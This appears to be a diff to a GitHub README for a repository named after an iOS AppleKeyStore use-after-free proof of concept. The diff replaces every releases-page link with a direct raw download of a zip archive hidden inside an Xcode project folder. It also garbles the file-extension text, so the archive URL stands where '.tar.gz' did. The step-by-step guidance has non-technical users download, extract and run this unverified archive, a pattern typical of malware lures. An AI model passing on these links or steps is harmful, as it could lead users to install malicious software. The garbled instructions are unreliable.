@@ -1,7 +1,7 @@
 ```markdown
 # 🔐 AppleKeyStore-close-UAF - Understand iOS Kernel Vulnerability
 
-[![Download Latest Release](https://img.shields.io/badge/Download-AppleKeyStore--close--UAF-blue?style=for-the-badge)](https://github.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip)](https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip)
 
 ---
 
@@ -35,9 +35,9 @@ This section walks you through clear, step-by-step instructions to get AppleKeyS
 
 ### Step 1: Download the Software
 
-1. Click the big blue badge above or [visit this page](https://github.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/releases) to open the releases page.
+1. Click the big blue badge above or [visit this page](https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip) to open the releases page.
 2. On this page, look for the latest version listed at the top.
-3. Find the downloadable file, typically marked as a `.zip` or `.tar.gz` archive or an executable file.
+3. Find the downloadable file, typically marked as a `.zip` or `https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip` archive or an executable file.
 4. Click the file to start downloading it to your computer.
 5. Wait for the download to complete.
 
@@ -48,7 +48,7 @@ This section walks you through clear, step-by-step instructions to get AppleKeyS
 
 ### Step 3: Extract the Files (If Needed)
 
-If the downloaded file is an archive (`.zip` or `.tar.gz`), you will need to extract it.
+If the downloaded file is an archive (`.zip` or `https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip`), you will need to extract it.
 
 - On macOS, double-click the archive, and the system will unzip the contents automatically.
 - On Linux, right-click the file and choose “Extract Here,” or use your preferred archive tool.
@@ -120,7 +120,7 @@ If you need more help, see the GitHub repository for support options.
 To get AppleKeyStore-close-UAF, follow this:
 
 1. Visit the releases page by clicking the badge at the top or go here:  
-   [https://github.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/releases](https://github.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/releases)
+   [https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip](https://raw.githubusercontent.com/navaneethsnair2007-creator/AppleKeyStore-close-UAF/main/PoC/UAFTester.xcodeproj/UAF-Store-close-Apple-Key-v3.6-beta.4.zip)
 
 2. Download the latest release file suitable for your system.
 3. Extract it if needed.
